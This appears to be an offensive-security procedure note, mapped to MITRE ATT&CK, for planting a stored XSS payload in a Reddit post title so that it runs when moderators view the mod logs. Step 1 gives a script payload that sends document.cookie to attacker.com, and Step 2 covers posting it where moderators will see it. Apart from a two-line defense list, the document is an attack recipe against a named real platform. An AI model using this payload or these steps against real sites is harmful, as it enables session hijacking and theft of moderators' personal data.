---
tags:
  - xss
  - stored-xss
  - web-injection
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques:
  - '[[JavaScript]]'
id: b6801947-9ee2-496e-868a-ea5392edaeee
created_at: '2025-12-13T23:56:20.314Z'
updated_at: '2025-12-13T23:56:20.314Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Create Post with XSS Payload

## Summary

This procedure involves creating a Reddit post with a malicious XSS payload in the title to exploit improper sanitization in moderation logs, enabling stored XSS attacks.

## Description

The attacker crafts a post title containing injectable JavaScript or HTML, such as script tags, which are not escaped when logged in mod notes. This sets up for later execution when moderators view logs, allowing theft of PII like emails.

## Requirements

1. Valid Reddit account with posting privileges in a subreddit
2. Web browser for accessing Reddit
3. Knowledge of XSS payload construction

## Defense

Defensive measures and detection strategies:

- Implement proper input sanitization and output escaping in all log views
- Monitor for suspicious post titles containing HTML/JS elements

## Objectives

1. Inject XSS payload into Reddit ecosystem
2. Prepare for moderator interaction
3. Enable future JavaScript execution

## Instructions

### Step 1: Craft Malicious Post Title

**Context**: Construct a post title with an XSS payload that will survive logging.

Create a title like: '<script>fetch("https://attacker.com/steal?data=" + encodeURIComponent(document.cookie));</script>'

> This payload would exfiltrate cookies or other data when executed.

### Step 2: Submit the Post

**Context**: Post to a subreddit likely to attract moderator attention.

Navigate to the subreddit, create a new post, insert the malicious title, and submit.

> Ensure the post is visible and awaits moderation.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[JavaScript]]

## Commands Used

- None

## Tools Used

- None

## Tags

- [[xss]]
- [[stored-xss]]
